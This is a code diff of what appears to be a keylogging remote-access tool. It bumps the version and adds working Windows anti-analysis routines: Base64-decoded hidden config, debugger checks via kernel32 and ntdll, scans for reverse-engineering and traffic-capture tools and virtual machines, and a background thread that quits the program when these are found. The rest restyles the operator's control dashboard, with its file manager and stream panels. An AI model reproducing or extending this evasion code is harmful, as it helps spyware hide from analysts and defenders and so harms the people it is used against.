@@ -18,7 +18,7 @@ TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
 UPDATE_URL = "BUILD_UPDATE_URL"
 KEYLOG_ENCRYPTION_KEY = "BUILD_ENCRYPTION_KEY"
-IGR_VERSION = "7.1"
+IGR_VERSION = "7.2"
 
 # ============================================================================
 # END OF CONFIGURATION - DO NOT EDIT BELOW THIS LINE
@@ -29,6 +29,207 @@ import random
 import socket
 import subprocess
 import sys
+import base64
+
+
+def _decode_cfg(value: str) -> str:
+    """Decrypt a config value that was Base64-encoded at build time (ENC: prefix)."""
+    if not value or not value.startswith("ENC:"):
+        return value
+    try:
+        return base64.b64decode(value[4:]).decode("utf-8", errors="replace")
+    except Exception:
+        return value
+
+
+def _apply_decryption():
+    """Decrypt all ENC:-prefixed config values at runtime."""
+    global DISCORD_WEBHOOK_URL, DISCORD_USERNAME, DASHBOARD_PASSWORD
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, UPDATE_URL, KEYLOG_ENCRYPTION_KEY
+    DISCORD_WEBHOOK_URL = _decode_cfg(DISCORD_WEBHOOK_URL)
+    DISCORD_USERNAME = _decode_cfg(DISCORD_USERNAME)
+    DASHBOARD_PASSWORD = _decode_cfg(DASHBOARD_PASSWORD)
+    TELEGRAM_BOT_TOKEN = _decode_cfg(TELEGRAM_BOT_TOKEN)
+    TELEGRAM_CHAT_ID = _decode_cfg(TELEGRAM_CHAT_ID)
+    UPDATE_URL = _decode_cfg(UPDATE_URL)
+    KEYLOG_ENCRYPTION_KEY = _decode_cfg(KEYLOG_ENCRYPTION_KEY)
+
+
+_apply_decryption()
+
+
+# ============================================================================
+# ANTI-ANALYSIS - Detect debuggers, VMs, and forensic tools
+# ============================================================================
+
+def _is_debugger_present() -> bool:
+    """Check if a user-mode debugger is attached via Windows API."""
+    try:
+        import ctypes
+        return bool(ctypes.windll.kernel32.IsDebuggerPresent())
+    except Exception:
+        return False
+
+
+def _check_remote_debugger() -> bool:
+    """Check for remote debugger via NtQueryInformationProcess."""
+    try:
+        import ctypes
+        ntdll = ctypes.windll.ntdll
+        ProcessDebugPort = 7
+        debug_port = ctypes.c_ulong(0)
+        status = ntdll.NtQueryInformationProcess(-1, ProcessDebugPort, ctypes.byref(debug_port), ctypes.sizeof(debug_port), None)
+        return debug_port.value != 0
+    except Exception:
+        return False
+
+
+def _check_debug_object() -> bool:
+    """Check for debug object handle via NtQueryInformationProcess (ProcessDebugObjectHandle)."""
+    try:
+        import ctypes
+        ntdll = ctypes.windll.ntdll
+        ProcessDebugObjectHandle = 0x1E
+        handle = ctypes.c_void_p(0)
+        ntdll.NtQueryInformationProcess(-1, ProcessDebugObjectHandle, ctypes.byref(handle), ctypes.sizeof(handle), None)
+        return handle.value is not None and handle.value != 0
+    except Exception:
+        return False
+
+
+def _detect_analysis_tools() -> list:
+    """Detect common reverse engineering and analysis tools running."""
+    detected = []
+    tool_signatures = [
+        "x64dbg", "x32dbg", "x96dbg", "ollydbg", "ida", "ida64",
+        "ghidra", "dnspy", "dotpeek", "ilspy", "de4dot",
+        "processhacker", "procmon", "procmon64", "procexp", "procexp64",
+        "wireshark", "fiddler", "httpdebugger", "httptoolkit",
+        "pestudio", "die", "hxd", "resourcehacker",
+        "apimonitor", "regshot", "sysinternals",
+        "httpdebuggerpro", "burpsuite", "charles",
+        "fakenet", "dumpcap", "tshark",
+    ]
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        DWORD = ctypes.c_ulong
+        HANDLE = ctypes.c_void_p
+        class PROCESSENTRY32(ctypes.Structure):
+            _fields_ = [
+                ("dwSize", DWORD), ("cntUsage", DWORD), ("th32ProcessID", DWORD),
+                ("th32DefaultHeapID", ctypes.c_void_p), ("th32ModuleID", DWORD),
+                ("cntThreads", DWORD), ("th32ParentProcessID", DWORD),
+                ("pcPriClassBase", ctypes.c_long), ("dwFlags", DWORD),
+                ("szExeFile", ctypes.c_char * 260),
+            ]
+        TH32CS_SNAPPROCESS = 0x00000002
+        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot == ctypes.c_void_p(-1).value:
+            return detected
+        entry = PROCESSENTRY32()
+        entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
+        if kernel32.Process32First(snapshot, ctypes.byref(entry)):
+            while True:
+                name = entry.szExeFile.decode("utf-8", errors="replace").lower()
+                for sig in tool_signatures:
+                    if sig in name:
+                        detected.append(name)
+                        break
+                if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
+                    break
+        kernel32.CloseHandle(snapshot)
+    except Exception:
+        pass
+    return detected
+
+
+def _detect_vm_environment() -> list:
+    """Detect common virtual machine indicators."""
+    indicators = []
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        DWORD = ctypes.c_ulong
+        HANDLE = ctypes.c_void_p
+        class PROCESSENTRY32(ctypes.Structure):
+            _fields_ = [
+                ("dwSize", DWORD), ("cntUsage", DWORD), ("th32ProcessID", DWORD),
+                ("th32DefaultHeapID", ctypes.c_void_p), ("th32ModuleID", DWORD),
+                ("cntThreads", DWORD), ("th32ParentProcessID", DWORD),
+                ("pcPriClassBase", ctypes.c_long), ("dwFlags", DWORD),
+                ("szExeFile", ctypes.c_char * 260),
+            ]
+        TH32CS_SNAPPROCESS = 0x00000002
+        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if snapshot == ctypes.c_void_p(-1).value:
+            return indicators
+        vm_processes = [
+            "vmtoolsd", "vmwaretray", "vmwareuser", "vmsrvc",
+            "vmacthlp", "vboxservice", "vboxtray", "xenservice",
+            "qemu-ga", "spicevc", "spicevd", "spicevv",
+        ]
+        entry = PROCESSENTRY32()
+        entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
+        if kernel32.Process32First(snapshot, ctypes.byref(entry)):
+            while True:
+                name = entry.szExeFile.decode("utf-8", errors="replace").lower()
+                for sig in vm_processes:
+                    if sig in name:
+                        indicators.append(name)
+                        break
+                if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
+                    break
+        kernel32.CloseHandle(snapshot)
+    except Exception:
+        pass
+    try:
+        mac = open(os.path.join(os.environ.get("TEMP", "."), "_igr_mac_check"), "w")
+        mac.close()
+        os.remove(os.path.join(os.environ.get("TEMP", "."), "_igr_mac_check"))
+    except Exception:
+        pass
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", 0, winreg.KEY_READ)
+        i = 0
+        while True:
+            try:
+                name = winreg.EnumKey(key, i).lower()
+                if any(v in name for v in ["vbox", "vmware", "xene", "qemu", "virtio"]):
+                    indicators.append(name)
+                i += 1
+            except OSError:
+                break
+        winreg.CloseKey(key)
+    except Exception:
+        pass
+    return indicators
+
+
+def _anti_analysis_check() -> bool:
+    """Run all anti-analysis checks. Returns True if safe to proceed."""
+    if _is_debugger_present():
+        return False
+    if _check_remote_debugger():
+        return False
+    if _check_debug_object():
+        return False
+    tools = _detect_analysis_tools()
+    if tools:
+        return False
+    return True
+
+
+def _delayed_anti_analysis():
+    """Background thread that periodically checks for analysis tools and exits if detected."""
+    while True:
+        try:
+            time.sleep(30)
+            if not _anti_analysis_check():
+                os._exit(0)
+        except Exception:
+            os._exit(0)
 
 # Runtime config loader - reads config.txt if BUILD_ placeholders detected
 def _load_runtime_config():
@@ -2620,11 +2821,80 @@ DASHBOARD_HTML = r'''
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Courier New', 'Consolas', monospace;
-            background: #0a0a0a;
-            color: #c084fc;
+            background: #000;
+            color: #fff;
             overflow-x: hidden;
             font-size: 14px;
         }
+        body.purple-mode {
+            background: #0a0a0a;
+            color: #c084fc;
+        }
+        body.purple-mode .section { background: #0f0a1a; border-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .section-title { color: #7c3aed; }
+        body.purple-mode .log-box { background: #050508; color: #888; border-color: rgba(124, 58, 237, 0.1); }
+        body.purple-mode .btn { color: #7c3aed; border-color: rgba(124, 58, 237, 0.3); }
+        body.purple-mode .btn:hover { background: rgba(124, 58, 237, 0.12); color: #c084fc; border-color: #7c3aed; box-shadow: 0 0 10px rgba(124, 58, 237, 0.15); }
+        body.purple-mode .btn.active { background: #7c3aed; color: #fff; }
+        body.purple-mode .btn.danger { border-color: rgba(239,68,68,0.3); color: #ef4444; }
+        body.purple-mode .btn.success { border-color: rgba(68,255,136,0.3); color: #44ff88; }
+        body.purple-mode .sidebar { background: #0a0a0f; border-right-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .nav-item { color: #888; }
+        body.purple-mode .nav-item:hover { background: rgba(124, 58, 237, 0.06); border-left-color: #7c3aed; color: #c084fc; }
+        body.purple-mode .nav-item.active { background: rgba(124, 58, 237, 0.1); border-left-color: #7c3aed; color: #fff; }
+        body.purple-mode .nav-icon { color: #7c3aed; }
+        body.purple-mode .sidebar-logo { color: #7c3aed; text-shadow: 0 0 10px rgba(124, 58, 237, 0.3); }
+        body.purple-mode .sidebar-toggle { color: #7c3aed; }
+        body.purple-mode .sidebar-header { border-bottom-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .sidebar-status { border-bottom-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode input, body.purple-mode select { background: #0a0a0a; color: #c084fc; border-color: rgba(124, 58, 237, 0.2); }
+        body.purple-mode input:focus, body.purple-mode select:focus { border-color: #7c3aed; }
+        body.purple-mode .info-card { background: #0f0a1a; border-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .info-value { color: #7c3aed; }
+        body.purple-mode .login-screen { background: #0a0a0a; }
+        body.purple-mode .login-box { background: #0f0a1a; border-color: rgba(124, 58, 237, 0.3); box-shadow: 0 0 40px rgba(124, 58, 237, 0.08); }
+        body.purple-mode .login-title { color: #7c3aed; text-shadow: 0 0 12px rgba(124, 58, 237, 0.4); }
+        body.purple-mode .login-input { background: #0a0a0a; border-color: rgba(124, 58, 237, 0.3); color: #c084fc; }
+        body.purple-mode .login-input:focus { border-color: #7c3aed; }
+        body.purple-mode .login-btn { background: #7c3aed; color: #000; }
+        body.purple-mode .login-btn:hover { box-shadow: 0 0 16px rgba(124, 58, 237, 0.4); }
+        body.purple-mode .command-bar input { background: #0a0a0a; border-color: rgba(124, 58, 237, 0.2); color: #c084fc; }
+        body.purple-mode .stream-badge { background: #7c3aed; color: #000; }
+        body.purple-mode .stream-box { background: #050508; border-color: rgba(124, 58, 237, 0.1); }
+        body.purple-mode .file-list { background: #050508; border-color: rgba(124, 58, 237, 0.1); }
+        body.purple-mode .file-item:hover { background: rgba(124, 58, 237, 0.06); }
+        body.purple-mode .file-item.selected { background: rgba(124, 58, 237, 0.12); }
+        body.purple-mode .file-ctx { background: #111; border-color: rgba(124, 58, 237, 0.3); }
+        body.purple-mode .file-ctx button { color: #ddd; }
+        body.purple-mode .file-ctx button:hover { background: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .file-breadcrumb span { color: #7c3aed; }
+        body.purple-mode .file-breadcrumb span:hover { background: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .file-actions button { color: #7c3aed; }
+        body.purple-mode .file-actions button:hover { background: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .file-icon.file { color: #7c3aed; }
+        body.purple-mode .status-bar { background: #0a0a0f; border-top-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .status-bar-dot.purple { background: #7c3aed; }
+        body.purple-mode .fab { background: #7c3aed; color: #000; box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4); }
+        body.purple-mode .fab-menu { background: #0f0a1a; border-color: rgba(124, 58, 237, 0.3); }
+        body.purple-mode .fab-menu button { color: #c084fc; }
+        body.purple-mode .fab-menu button:hover { background: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .log-box::after { color: #7c3aed; }
+        body.purple-mode .log-entry.info { color: #7c3aed; }
+        body.purple-mode .ctx-menu { background: #0f0a1a; border-color: rgba(124, 58, 237, 0.3); }
+        body.purple-mode .ctx-menu button { color: #c084fc; }
+        body.purple-mode .ctx-menu button:hover { background: rgba(124, 58, 237, 0.15); color: #fff; }
+        body.purple-mode .volume-slider { background: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .volume-slider::-webkit-slider-thumb { background: #7c3aed; }
+        body.purple-mode .proc-table th { border-bottom-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .proc-table td { border-bottom-color: rgba(124, 58, 237, 0.06); }
+        body.purple-mode .proc-table tr:hover td { background: rgba(124, 58, 237, 0.06); color: #c084fc; }
+        body.purple-mode .section-header { border-bottom-color: rgba(124, 58, 237, 0.1); }
+        body.purple-mode .file-header { border-bottom-color: rgba(124, 58, 237, 0.15); }
+        body.purple-mode .file-item { border-bottom-color: rgba(124, 58, 237, 0.05); }
+        body.purple-mode .fullscreen-btn { background: rgba(10,10,10,0.8); color: #c084fc; border-color: rgba(124, 58, 237, 0.3); }
+        body.purple-mode .offline-banner { background: #1a0808; color: #ef4444; border-bottom: 2px solid #ef4444; }
+        body.purple-mode ::-webkit-scrollbar-track { background: #0a0a0a; }
+        body.purple-mode ::-webkit-scrollbar-thumb { background: rgba(124, 58, 237, 0.2); }
         body.light-theme {
             background: #f0f0f5;
             color: #6d28d9;
@@ -2654,21 +2924,20 @@ DASHBOARD_HTML = r'''
         /* Login */
         .login-screen {
             position: fixed; inset: 0;
-            background: #0a0a0a;
+            background: #000;
             display: flex; align-items: center; justify-content: center;
             z-index: 10000;
         }
         .login-box {
-            background: #0f0a1a;
-            border: 1px solid rgba(124, 58, 237, 0.3);
+            background: #0a0a0a;
+            border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 10px;
             padding: 36px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(124, 58, 237, 0.08);
         }
         .login-title {
-            font-size: 42px; color: #7c3aed;
-            text-shadow: 0 0 12px rgba(124, 58, 237, 0.4);
+            font-size: 42px; color: #fff;
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.1);
             margin-bottom: 8px;
         }
         .login-subtitle {
@@ -2677,22 +2946,22 @@ DASHBOARD_HTML = r'''
         }
         .login-input {
             width: 280px; padding: 12px 16px;
-            background: #0a0a0a;
-            border: 1px solid rgba(124, 58, 237, 0.3);
-            border-radius: 6px; color: #c084fc;
+            background: #000;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 6px; color: #fff;
             font-family: 'Courier New', monospace;
             font-size: 15px; margin-bottom: 20px;
         }
         .login-input:focus { outline: none; border-color: #7c3aed; }
         .login-btn {
             padding: 12px 44px;
-            background: #7c3aed; color: #000;
-            border: none; border-radius: 4px;
+            background: #7c3aed; color: #fff;
+            border: 2px solid #9333ea; border-radius: 4px;
             font-family: 'Courier New', monospace;
             font-size: 15px; font-weight: bold;
             cursor: pointer;
         }
-        .login-btn:hover { box-shadow: 0 0 16px rgba(124, 58, 237, 0.4); }
+        .login-btn:hover { background: #6d28d9; box-shadow: 0 0 16px rgba(124, 58, 237, 0.4); }
         .login-error { color: #ef4444; margin-top: 16px; font-size: 13px; display: none; }
 
         /* Layout */
@@ -2702,8 +2971,8 @@ DASHBOARD_HTML = r'''
         /* Sidebar */
         .sidebar {
             width: 220px; min-width: 220px;
-            background: #0a0a0f;
-            border-right: 1px solid rgba(124, 58, 237, 0.15);
+            background: #0a0a0a;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
             height: 100vh; overflow-y: auto;
             display: flex; flex-direction: column;
             transition: width 0.2s;
@@ -2716,16 +2985,16 @@ DASHBOARD_HTML = r'''
         .sidebar.collapsed .sidebar-header { justify-content: center; padding: 14px 0; }
         .sidebar-header {
             padding: 18px 16px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.15);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             display: flex; align-items: center; justify-content: space-between;
         }
         .sidebar-logo {
-            font-size: 22px; font-weight: bold; color: #7c3aed;
-            text-shadow: 0 0 10px rgba(124, 58, 237, 0.3);
+            font-size: 22px; font-weight: bold; color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
         }
         .sidebar-toggle {
             background: none; border: none;
-            color: #7c3aed; font-size: 18px;
+            color: #fff; font-size: 18px;
             cursor: pointer; padding: 2px;
         }
         .sidebar.collapsed .sidebar-toggle { margin: 0 auto; }
@@ -2733,7 +3002,7 @@ DASHBOARD_HTML = r'''
         /* Sidebar Status */
         .sidebar-status {
             padding: 10px 16px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.15);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             display: flex; flex-direction: column; gap: 6px;
         }
         .status-row {
@@ -2756,12 +3025,12 @@ DASHBOARD_HTML = r'''
             display: flex; align-items: center; gap: 10px;
             font-size: 13px; color: #888;
         }
-        .nav-item:hover { background: rgba(124, 58, 237, 0.06); border-left-color: #7c3aed; color: #c084fc; }
-        .nav-item.active { background: rgba(124, 58, 237, 0.1); border-left-color: #7c3aed; color: #fff; }
+        .nav-item:hover { background: rgba(255, 255, 255, 0.05); border-left-color: #7c3aed; color: #fff; }
+        .nav-item.active { background: rgba(124, 58, 237, 0.15); border-left-color: #7c3aed; color: #fff; }
         .nav-icon {
             font-size: 15px; width: 22px;
             text-align: center; font-weight: bold;
-            color: #7c3aed;
+            color: #fff;
         }
 
         /* Main Content */
@@ -2782,10 +3051,10 @@ DASHBOARD_HTML = r'''
         }
         .command-bar input {
             flex: 1; margin-bottom: 0;
-            background: #0a0a0a;
-            border: 1px solid rgba(124, 58, 237, 0.2);
+            background: #000;
+            border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 6px; padding: 10px 14px;
-            font-size: 13px; color: #c084fc;
+            font-size: 13px; color: #fff;
         }
         .command-bar input:focus { border-color: #7c3aed; }
 
@@ -2796,18 +3065,18 @@ DASHBOARD_HTML = r'''
             gap: 10px; margin-bottom: 20px;
         }
         .info-card {
-            background: #0f0a1a;
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            background: #0a0a0a;
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
             padding: 14px; text-align: center;
         }
-        .info-label { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
-        .info-value { font-size: 18px; color: #7c3aed; font-weight: bold; }
+        .info-label { font-size: 10px; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+        .info-value { font-size: 18px; color: #fff; font-weight: bold; }
 
         /* Section */
         .section {
-            background: #0f0a1a;
-            border: 1px solid rgba(124, 58, 237, 0.15);
+            background: #0a0a0a;
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 8px;
             padding: 16px; margin-bottom: 14px;
             flex: 1; display: flex; flex-direction: column;
@@ -2817,23 +3086,23 @@ DASHBOARD_HTML = r'''
             display: flex; justify-content: space-between; align-items: center;
             flex-wrap: wrap; gap: 8px;
             margin-bottom: 14px; padding-bottom: 10px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .section-title { font-size: 13px; font-weight: 600; color: #7c3aed; text-transform: uppercase; letter-spacing: 1px; }
+        .section-title { font-size: 13px; font-weight: 600; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
         .section-header > div { display: flex; gap: 6px; flex-wrap: wrap; }
 
         /* Buttons */
         .btn {
-            background: transparent; color: #7c3aed;
-            border: 1px solid rgba(124, 58, 237, 0.3);
+            background: transparent; color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
             padding: 8px 16px; border-radius: 5px;
             cursor: pointer; font-family: 'Courier New', monospace;
             font-size: 13px; font-weight: bold;
             transition: background 0.2s, box-shadow 0.2s;
             margin: 3px;
         }
-        .btn:hover { background: rgba(124, 58, 237, 0.12); color: #c084fc; border-color: #7c3aed; box-shadow: 0 0 10px rgba(124, 58, 237, 0.15); }
-        .btn.active { background: #7c3aed; color: #fff; }
+        .btn:hover { background: rgba(255, 255, 255, 0.05); color: #fff; border-color: #7c3aed; box-shadow: 0 0 10px rgba(124, 58, 237, 0.15); }
+        .btn.active { background: #7c3aed; color: #fff; border-color: #7c3aed; }
         .btn.danger { border-color: rgba(239,68,68,0.3); color: #ef4444; }
         .btn.danger:hover { background: #ef4444; color: #000; }
         .btn.small { padding: 6px 12px; font-size: 11px; }
@@ -2842,10 +3111,10 @@ DASHBOARD_HTML = r'''
 
         /* Inputs */
         input, select, textarea {
-            background: #0a0a0a;
-            border: 1px solid rgba(124, 58, 237, 0.2);
+            background: #000;
+            border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 5px; padding: 9px 12px;
-            color: #c084fc; font-family: 'Courier New', monospace;
+            color: #fff; font-family: 'Courier New', monospace;
             font-size: 13px; width: 100%;
             margin-bottom: 10px;
         }
@@ -2854,8 +3123,8 @@ DASHBOARD_HTML = r'''
 
         /* Log Box */
         .log-box {
-            background: #050508;
-            border: 1px solid rgba(124, 58, 237, 0.1);
+            background: #000;
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 6px; padding: 12px;
             min-height: 160px; flex: 1; overflow-y: auto;
             font-size: 12px; white-space: pre-wrap;
@@ -2865,8 +3134,8 @@ DASHBOARD_HTML = r'''
 
         /* Stream Box */
         .stream-box {
-            background: #050508;
-            border: 1px solid rgba(124, 58, 237, 0.1);
+            background: #000;
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 8px;
             min-height: 350px; flex: 1;
             display: flex; align-items: center; justify-content: center;
@@ -2880,15 +3149,15 @@ DASHBOARD_HTML = r'''
         }
         .stream-badge {
             position: absolute; top: 10px; right: 10px;
-            background: #7c3aed; color: #000;
+            background: #7c3aed; color: #fff;
             padding: 5px 12px; border-radius: 4px;
             font-size: 11px; font-weight: bold; z-index: 10;
         }
         .fullscreen-btn {
             position: absolute; top: 10px; left: 10px;
-            background: rgba(10,10,10,0.8);
-            color: #c084fc;
-            border: 1px solid rgba(124, 58, 237, 0.3);
+            background: rgba(0,0,0,0.8);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
             padding: 7px 12px; border-radius: 4px;
             cursor: pointer; font-size: 13px; z-index: 10;
         }
@@ -2898,31 +3167,31 @@ DASHBOARD_HTML = r'''
         .file-path-bar { display: flex; gap: 8px; margin-bottom: 10px; }
         .file-path-bar input { flex: 1; }
         .file-breadcrumb { display: flex; gap: 2px; margin-bottom: 8px; flex-wrap: wrap; align-items: center; font-size: 12px; }
-        .file-breadcrumb span { color: #7c3aed; cursor: pointer; padding: 2px 6px; border-radius: 3px; }
-        .file-breadcrumb span:hover { background: rgba(124, 58, 237, 0.15); }
+        .file-breadcrumb span { color: #fff; cursor: pointer; padding: 2px 6px; border-radius: 3px; }
+        .file-breadcrumb span:hover { background: rgba(255, 255, 255, 0.05); }
         .file-breadcrumb .sep { color: #555; cursor: default; padding: 0 1px; }
         .file-breadcrumb .sep:hover { background: none; }
         .file-toolbar { display: flex; gap: 6px; margin-bottom: 10px; flex-wrap: wrap; }
         .file-toolbar .btn { font-size: 11px; padding: 4px 10px; }
         .file-list {
-            background: #050508;
-            border: 1px solid rgba(124, 58, 237, 0.1);
+            background: #000;
+            border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 6px; overflow-y: auto;
         }
         .file-header {
             display: grid; grid-template-columns: 1fr 90px 130px 60px;
             padding: 8px 14px; font-size: 11px; color: #666;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.15);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;
         }
         .file-item {
             display: grid; grid-template-columns: 1fr 90px 130px 60px;
             padding: 8px 14px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.05);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             cursor: pointer; align-items: center;
             font-size: 13px;
         }
-        .file-item:hover { background: rgba(124, 58, 237, 0.06); }
+        .file-item:hover { background: rgba(255, 255, 255, 0.03); }
         .file-item.selected { background: rgba(124, 58, 237, 0.12); }
         .file-item:last-child { border-bottom: none; }
         .file-name { display: flex; align-items: center; gap: 8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
@@ -2936,18 +3205,18 @@ DASHBOARD_HTML = r'''
         .file-icon.archive { color: #a855f7; }
         .file-size, .file-mtime, .file-actions { font-size: 11px; color: #888; }
         .file-actions { display: flex; gap: 4px; }
-        .file-actions button { background: none; border: none; color: #7c3aed; cursor: pointer; font-size: 11px; padding: 2px 4px; border-radius: 3px; }
-        .file-actions button:hover { background: rgba(124, 58, 237, 0.15); }
+        .file-actions button { background: none; border: none; color: #fff; cursor: pointer; font-size: 11px; padding: 2px 4px; border-radius: 3px; }
+        .file-actions button:hover { background: rgba(255, 255, 255, 0.05); }
         .file-actions button.del { color: #ef4444; }
         .file-ctx {
-            position: fixed; background: #111; border: 1px solid rgba(124,58,237,0.3);
+            position: fixed; background: #0a0a0a; border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 6px; padding: 4px 0; z-index: 9999; min-width: 160px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.5); display: none;
         }
         .file-ctx button { display: block; width: 100%; text-align: left; background: none; border: none; color: #ddd; padding: 8px 14px; font-size: 12px; cursor: pointer; }
-        .file-ctx button:hover { background: rgba(124,58,237,0.15); }
+        .file-ctx button:hover { background: rgba(255, 255, 255, 0.05); }
         .file-ctx button.danger { color: #ef4444; }
-        .file-ctx .divider { height: 1px; background: rgba(124,58,237,0.15); margin: 4px 0; }
+        .file-ctx .divider { height: 1px; background: rgba(255, 255, 255, 0.1); margin: 4px 0; }
 
         /* Animations */
         @keyframes pulse {
@@ -2959,7 +3228,7 @@ DASHBOARD_HTML = r'''
         .volume-slider {
             -webkit-appearance: none; appearance: none;
             width: 100%; height: 4px;
-            background: rgba(124, 58, 237, 0.15);
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 2px; outline: none;
             border: none; margin: 8px 0;
         }
@@ -2972,9 +3241,9 @@ DASHBOARD_HTML = r'''
 
         /* Process table */
         .proc-table { width: 100%; border-collapse: collapse; font-size: 12px; }
-        .proc-table th { text-align: left; padding: 6px 8px; color: #555; text-transform: uppercase; letter-spacing: 1px; font-size: 10px; border-bottom: 1px solid rgba(124, 58, 237, 0.15); }
-        .proc-table td { padding: 6px 8px; border-bottom: 1px solid rgba(124, 58, 237, 0.06); color: #888; }
-        .proc-table tr:hover td { background: rgba(124, 58, 237, 0.06); color: #c084fc; }
+        .proc-table th { text-align: left; padding: 6px 8px; color: #666; text-transform: uppercase; letter-spacing: 1px; font-size: 10px; border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+        .proc-table td { padding: 6px 8px; border-bottom: 1px solid rgba(255, 255, 255, 0.05); color: #888; }
+        .proc-table tr:hover td { background: rgba(255, 255, 255, 0.03); color: #fff; }
 
         /* Mobile */
         @media (max-width: 768px) {
@@ -2982,10 +3251,10 @@ DASHBOARD_HTML = r'''
                 position: fixed; bottom: 0; left: 0; right: 0; top: auto;
                 width: 100% !important; min-width: unset !important;
                 height: 54px; flex-direction: row; z-index: 1000;
-                border-top: 1px solid rgba(124, 58, 237, 0.15);
+                border-top: 1px solid rgba(255, 255, 255, 0.1);
                 border-right: none;
                 overflow-x: auto; overflow-y: hidden;
-                background: #0a0a0f;
+                background: #0a0a0a;
             }
             .sidebar.collapsed { width: 100% !important; min-width: unset !important; }
             .sidebar-header, .sidebar-logo, .sidebar-toggle, .sidebar-status { display: none; }
@@ -3047,13 +3316,13 @@ DASHBOARD_HTML = r'''
 
         /* Scrollbar */
         ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-track { background: #0a0a0a; }
-        ::-webkit-scrollbar-thumb { background: rgba(124, 58, 237, 0.2); border-radius: 3px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.15); border-radius: 3px; }
 
         /* Status Bar */
         .status-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
-            background: #0a0a0f; border-top: 1px solid rgba(124, 58, 237, 0.15);
+            background: #0a0a0a; border-top: 1px solid rgba(255, 255, 255, 0.1);
             display: flex; align-items: center; justify-content: space-between;
             padding: 4px 16px; font-size: 10px; color: #555; z-index: 900;
         }
@@ -3068,24 +3337,24 @@ DASHBOARD_HTML = r'''
         .fab {
             display: none; position: fixed; bottom: 70px; right: 16px;
             width: 52px; height: 52px; border-radius: 50%;
-            background: #7c3aed; color: #000; border: none;
+            background: #7c3aed; color: #fff; border: 2px solid #9333ea;
             font-size: 22px; font-weight: bold; cursor: pointer;
             z-index: 999; box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4);
         }
         .fab-menu {
             display: none; position: fixed; bottom: 130px; right: 16px;
-            background: #0f0a1a; border: 1px solid rgba(124, 58, 237, 0.3);
+            background: #0a0a0a; border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 8px; padding: 8px; z-index: 999;
             flex-direction: column; gap: 4px;
         }
         .fab-menu.open { display: flex; }
         .fab-menu button {
-            background: transparent; color: #c084fc; border: none;
+            background: transparent; color: #fff; border: none;
             padding: 10px 16px; text-align: left; cursor: pointer;
             font-family: 'Courier New', monospace; font-size: 12px;
             border-radius: 4px;
         }
-        .fab-menu button:hover { background: rgba(124, 58, 237, 0.15); }
+        .fab-menu button:hover { background: rgba(255, 255, 255, 0.05); }
 
